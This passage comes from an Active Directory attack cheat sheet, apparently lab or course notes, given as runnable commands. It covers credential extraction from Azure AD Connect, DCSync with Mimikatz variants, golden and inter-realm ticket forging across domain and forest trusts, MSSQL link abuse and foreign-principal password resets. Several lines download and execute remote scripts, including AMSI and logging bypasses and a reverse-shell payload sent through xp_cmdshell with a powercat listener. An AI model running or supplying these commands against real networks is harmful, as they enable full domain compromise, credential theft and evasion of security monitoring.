      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"samAccountName -like 'MSOL_*'"</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="p">,</span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\us-adconnect\C</span><span class="err">$</span><span class="nx">\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Downloads\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\us-adconnect\C</span><span class="err">$</span><span class="nx">\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Downloads\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-adconnect</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">cd</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="nx">\Downloads</span><span class="w">
</span><span class="n">RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Extract credentials of MSOL_</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://192.168.100.x/adconnect.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">ADconnect</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Now we can run DCsync (From elevated shell)</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:domain.local\MSOL_16fb75d0227d</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\administrator /domain:domain.local"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>DCsync (from a normal shell)</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:domain.local\MSOL_16fb75d0227d</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\administrator /domain:domain.local"'</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Domain Privesc (TrustKey &amp; KRBTGT)</summary>
    <div class="content">
      <p> </p>

      <p><strong>Using TRUSTKEY</strong></p>

      <p><strong>With DA - Escalate to EA or DA of the parent domain</strong>:</p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/opsec</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span><span class="n">lsadump::trust</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>Grab the RC4 of [ In ] child domain -&gt; parent domain**</p>
      </blockquote>

      <p><strong>Create the inter-realm TGT using the trust key</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /rc4:&lt;hash&gt; /user:Administrator /service:krbtgt /target:domain.local /ticket:C:\AD\Tools\trust_tkt.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\AD\Tools\trust_tkt.kirbi</span><span class="w"> </span><span class="nx">/service:CIFS/domain-dc.domain.local</span><span class="w"> </span><span class="nx">/dc:domain-dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">klist</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir</span><span class="w"> </span><span class="nx">\\domain-dc.domain.local\c</span><span class="err">$</span><span class="w">
</span></code></pre></div>      </div>
      <p> </p>

      <p><strong>Using KRBTGT Hash</strong></p>

      <p><strong>Create inter-realm TGT with SID history for Enterprise Admins</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:&lt;hash&gt; /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">domain-dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Abuse Trust Relationship (Forest)</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /ptt"</span><span class="w">
</span><span class="n">lsadump::dcsync</span><span class="w"> </span><span class="nx">/user:domain\user</span><span class="err">$</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy SafetyKatz and Rubeus</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\BetterSafetyKatz.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Forge an inter-realm TGT</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /rc4:&lt;hash&gt; /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\Users\Public\sharedwithdomain.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\sharedwithdomain.kirbi</span><span class="w"> </span><span class="nx">/service:CIFS/dc.domain.local</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With the CIFS service we can access the share</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir</span><span class="w"> </span><span class="nx">\\dc.domain.local\eushare</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>Access the target forest using PowerShell Remoting</p>
      </blockquote>

      <p><strong>Check if SIDHistroy is enabled for the trust between the 2 Forests</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check if there are any groups with SID&gt;1000</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'SID -ge "S-1-5-21-4066061358-3942393892-617142613-1000"'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Create an inter-realm ticket and Inject the SIDHistory</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:&lt;hash&gt; /service:krbtgt /target:domain.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\domainnet.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Request a TGS for HTTP</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Users\Public\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\Users\Public\domainnet.kirbi</span><span class="w"> </span><span class="nx">/service:HTTP/domain-net.domain.local</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">domain-net.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>MSSQL</summary>
    <div class="content">

      <p><strong>Enumerate database links</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerupSQL-master\PowerupSQL.psd1</span><span class="w">
</span><span class="n">Get-SQLInstanceDomain</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-SQLServerInfo</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Get-SQLServerLink</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql.domain.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''whoami'''</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Open a Listener</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\powercat.ps1</span><span class="w">
</span><span class="nx">powercat</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">1000</span><span class="w">
</span><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.X/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.X/Invoke-PowerShellTcpEx.ps1)"'''</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Enable RPC Out and xp_cmdshell with SA permission</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"exec sp_serveroption @server='db-sqlsrv', @optname='rpc', @optvalue='TRUE'"</span><span class="w">
</span><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"exec sp_serveroption @server='db-sqlsrv', @optname='rpc out', @optvalue='TRUE'"</span><span class="w">
</span><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"EXECUTE ('sp_configure ''show advanced options'',1;reconfigure;') AT ""db-sqlsrv"""</span><span class="w">
</span><span class="n">Invoke-SqlCmd</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure') AT ""db-sqlsrv"""</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Now Try to execute commands recursively again</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''whoami'''</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Execute commands in a particular link database</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">us-mssql</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s1">'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.x/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.x/Invoke-PowerShellTcpEx.ps1)"'''</span><span class="w"> </span><span class="nt">-QueryTarget</span><span class="w"> </span><span class="nx">db-sqlsrv</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Foreign Security Principals (FSPs)</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://192.168.100.x/PowerView.ps1'</span><span class="p">)</span><span class="w">
</span><span class="nx">Note:</span><span class="w"> </span><span class="nx">Make</span><span class="w"> </span><span class="nx">sure</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nx">AMSI</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="nx">executing</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">commands</span><span class="w">
</span><span class="n">Get-ForestTrust</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Search for</strong>:</p>

      <ul>
        <li>TrustType: Forest</li>
        <li>TrustDirection: Bidirectional</li>
      </ul>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>See if any <em>IdentityReferenceName</em> has <em>ActiveDirectoryRights</em> (GenericAll) to any <em>ObjectDN</em></p>
      </blockquote>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">dbxsvc</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="p">(</span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password@123'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="p">)</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w"> </span><span class="err">–</span><span class="nx">Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Enumerate FSPs</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-ForeignGroup</span><span class="w"> </span><span class="err">–</span><span class="nx">Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Get-DomainUser</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">dbvendor.local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectSid</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'S-1-5-21-569087967-1859921580-1949641513-4101'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Accessing with WINRS</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">db-dc.db.local</span><span class="w"> </span><span class="nt">-u</span><span class="p">:</span><span class="nx">dbvendor\dbxsvc</span><span class="w"> </span><span class="nt">-p</span><span class="p">:</span><span class="nx">Password</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="s2">"whoami"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Accessing with PowerShell Remote</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password@123'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="w"> </span><span class="p">(</span><span class="s2">"dbvendor\dbxsvc"</span><span class="p">,</span><span class="w"> </span><span class="nv">$passwd</span><span class="p">)</span><span class="w">
</span><span class="nv">$dbdc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="nt">-Computername</span><span class="w"> </span><span class="nx">db-dc.db.local</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$creds</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-scriptblock</span><span class="p">{</span><span class="n">whoami</span><span class="p">;</span><span class="n">hostname</span><span class="p">}</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$dbdc</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>PAM Trust</summary>
    <div class="content">
      <p> </p>

      <p><strong>Enumerate Foreign Security Principals</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">objectClass</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s2">"foreignSecurityPrincipal"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="n">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Find out which group DA it is a member of</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Member</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Member</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'S-1-5-21-2781415573-3701854478-2406986946-500'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>In this case the DA is a member of the built-in administrators group on the target forest</p>
      </blockquote>

      <p><strong>So we need to grab a DA access</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:</span><span class="err">&lt;</span><span class="nx">domain</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dc:</span><span class="err">&lt;</span><span class="nx">dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check if PAM trust is enabled</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{(</span><span class="n">ForestTransitive</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">SIDFilteringQuarantined</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$False</span><span class="p">)}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Search for</strong>:</p>

      <ul>
        <li>ForestTransitive : True</li>
        <li>SIDFilteringForestAware : False</li>
        <li>the DistinguishedName</li>
      </ul>

      <p><strong>Use the privileges of DA to extract credentials of DA of the target Forest</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\Administrator /domain:domain.local"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
